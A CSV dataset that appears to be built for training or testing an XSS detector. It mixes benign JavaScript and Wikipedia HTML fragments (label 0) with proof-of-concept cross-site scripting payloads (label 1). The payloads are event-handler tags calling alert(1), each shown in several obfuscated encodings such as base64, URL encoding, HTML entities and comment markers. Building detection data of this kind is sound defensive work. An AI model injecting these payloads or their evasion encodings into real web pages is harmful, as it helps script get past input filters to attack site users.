sample_id,variant_id,technique,payload_original,payload_obfuscated,label
0,0,none,_maybeenablecycle() { if (!this._config.ride) { return,_maybeenablecycle() { if (!this._config.ride) { return,0
1,0,none,"m.initializejquerywrapper(parallax, 'parallax', 'm_parallax')","m.initializejquerywrapper(parallax, 'parallax', 'm_parallax')",0
2,0,none,"var outevent = attachevent(""mouseout"", document.documentelement, documentleave, { handlenumbers: data.handlenumbers });","var outevent = attachevent(""mouseout"", document.documentelement, documentleave, { handlenumbers: data.handlenumbers });",0
3,0,none,switch (event.type) {,switch (event.type) {,0
4,1,base64,"<dt onmousemove=""alert(1)"">test</dt>",PGR0IG9ubW91c2Vtb3ZlPSJhbGVydCgxKSI+dGVzdDwvZHQ+,1
4,2,comment_marker,"<dt onmousemove=""alert(1)"">test</dt>","<dt/*OBF*/ onmousem/*OBF*/ove/*OBF*/=""alert(1)"">te/*OBF*/st</dt>",1
4,3,html_then_urlencode,"<dt onmousemove=""alert(1)"">test</dt>",%26lt%3Bdt%20onmousemove%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fdt%26gt%3B,1
5,0,none,"<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />","<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />",0
6,0,none,$(this.modalel).remove(); this.destroyselects(); this.el.m_datepicker = undefined;,$(this.modalel).remove(); this.destroyselects(); this.el.m_datepicker = undefined;,0
7,0,none,"let offset = this.options.margin + this.options.transitionmovement; let edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {","let offset = this.options.margin + this.options.transitionmovement; let edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {",0
8,0,none,this._verticallyscrolling = false; anim.remove(this.el); anim.remove(this._overlay);,this._verticallyscrolling = false; anim.remove(this.el); anim.remove(this._overlay);,0
9,0,none,".on('click', this.done.bind(this)); confirmationbtnscontainer.appendto(this.footer); }",".on('click', this.done.bind(this)); confirmationbtnscontainer.appendto(this.footer); }",0
10,0,none,if (q >= g.currenttime) for (var g = 0,if (q >= g.currenttime) for (var g = 0,0
11,1,html_entities,<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,&lt;multicol id=x tabindex=1 onfocusin=alert(1)&gt;&lt;/multicol&gt;,1
11,2,urlencode,<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,%3Cmulticol%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fmulticol%3E,1
11,3,base64,<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,PG11bHRpY29sIGlkPXggdGFiaW5kZXg9MSBvbmZvY3VzaW49YWxlcnQoMSk+PC9tdWx0aWNvbD4=,1
12,1,urlencode,"<acronym ondblclick=""alert(1)"">test</acronym>",%3Cacronym%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Facronym%3E,1
12,2,whitespace_noise,"<acronym ondblclick=""alert(1)"">test</acronym>","<acronym ondblclick="" alert(1)"">  test</acronym>",1
12,3,html_entities,"<acronym ondblclick=""alert(1)"">test</acronym>",&lt;acronym ondblclick=&quot;alert(1)&quot;&gt;test&lt;/acronym&gt;,1
13,0,none,const data_api_key$2 = '.data-api'; const escape_key$1 = 'escape'; const event_hide$4 = `hide${event_key$4}`;,const data_api_key$2 = '.data-api'; const escape_key$1 = 'escape'; const event_hide$4 = `hide${event_key$4}`;,0
14,1,html_then_urlencode,"<applet onmousemove=""alert(1)"">test</applet>",%26lt%3Bapplet%20onmousemove%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fapplet%26gt%3B,1
14,2,urlencode,"<applet onmousemove=""alert(1)"">test</applet>",%3Capplet%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,1
14,3,comment_marker,"<applet onmousemove=""alert(1)"">test</applet>","<applet onmousemove=""alert(1)"">test</applet>",1
15,1,whitespace_noise,"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>","<  summary draggable=""  true"" ondragleave=""alert(1) "">test</summary>",1
15,2,urlencode,"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",%3Csummary%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,1
15,3,base64,"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",PHN1bW1hcnkgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdsZWF2ZT0iYWxlcnQoMSkiPnRlc3Q8L3N1bW1hcnk+,1
16,0,none,"<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>","<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>",0
17,0,none,"<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>","<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>",0
18,0,none,const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),0
19,0,none,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,0
20,0,none,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,0
21,1,urlencode,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",%3Cdel%20draggable%3D%22true%22%20ondrag%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,1
21,2,base64,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",PGRlbCBkcmFnZ2FibGU9InRydWUiIG9uZHJhZz0iYWxlcnQoMSkiPnRlc3Q8L2RlbD4=,1
21,3,html_then_urlencode,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",%26lt%3Bdel%20draggable%3D%26quot%3Btrue%26quot%3B%20ondrag%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fdel%26gt%3B,1
22,0,none,"return acc; }, {}); return object.keys(overflows).sort(function (a, b) {","return acc; }, {}); return object.keys(overflows).sort(function (a, b) {",0
23,0,none,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,0
24,1,base64,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",PHN0eWxlPkBrZXlmcmFtZXMgeHtmcm9tIHtsZWZ0OjA7fXRvIHtsZWZ0OiAxMDAwcHg7fX06dGFyZ2V0IHthbmltYXRpb246MTBzIGVhc2UtaW4tb3V0IDBzIDEgeDt9PC9zdHlsZT48aHIgaWQ9eCBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IiBvbmFuaW1hdGlvbmNhbmNlbD0iYWxlcnQoMSkiPjwvaHI+,1
24,2,double_urlencode,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",%253Cstyle%253E%2540keyframes%2520x%257Bfrom%2520%257Bleft%253A0%253B%257Dto%2520%257Bleft%253A%25201000px%253B%257D%257D%253Atarget%2520%257Banimation%253A10s%2520ease-in-out%25200s%25201%2520x%253B%257D%253C%252Fstyle%253E%253Chr%2520id%253Dx%2520style%253D%2522position%253Aabsolute%253B%2522%2520onanimationcancel%253D%2522alert%25281%2529%2522%253E%253C%252Fhr%253E,1
24,3,html_then_urlencode,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",%26lt%3Bstyle%26gt%3B%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bhr%20id%3Dx%20style%3D%26quot%3Bposition%3Aabsolute%3B%26quot%3B%20onanimationcancel%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B%2Fhr%26gt%3B,1
25,0,none,"const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');","const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');",0
26,0,none,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,0
27,0,none,const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',0
28,0,none,jqueryevent.preventdefault(); } return evt;,jqueryevent.preventdefault(); } return evt;,0
29,1,urlencode,"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cdel%20id%3Dx%20style%3D%22transition%3Acolor%201s%22%20ontransitionend%3Dalert%281%29%3E%3C%2Fdel%3E,1
29,2,base64,"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOnJlZDt9PC9zdHlsZT48ZGVsIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMXMiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L2RlbD4=,1
29,3,html_entities,"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;del id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/del&gt;,1
30,0,none,"this._queuecallback(completecallback, this._element, true) } hide() {","this._queuecallback(completecallback, this._element, true) } hide() {",0
31,0,none,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,0
32,0,none,} if (opts.isdisabled) { arr.push('is-disabled');,} if (opts.isdisabled) { arr.push('is-disabled');,0
33,1,base64,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PG5vZW1iZWQgb25kcm9wPWFsZXJ0KDEpIGNvbnRlbnRlZGl0YWJsZT5kcm9wIGhlcmU8L25vZW1iZWQ+,1
33,2,whitespace_noise,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>","<div draggable=""true"" contenteditable> drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",1
33,3,urlencode,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cnoembed%20ondrop%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fnoembed%3E,1
34,0,none,setoptions: function setoptions(setoptionsaction) {,setoptions: function setoptions(setoptionsaction) {,0
35,0,none,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,0
36,0,none,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,0
37,0,none,"</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>","</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>",0
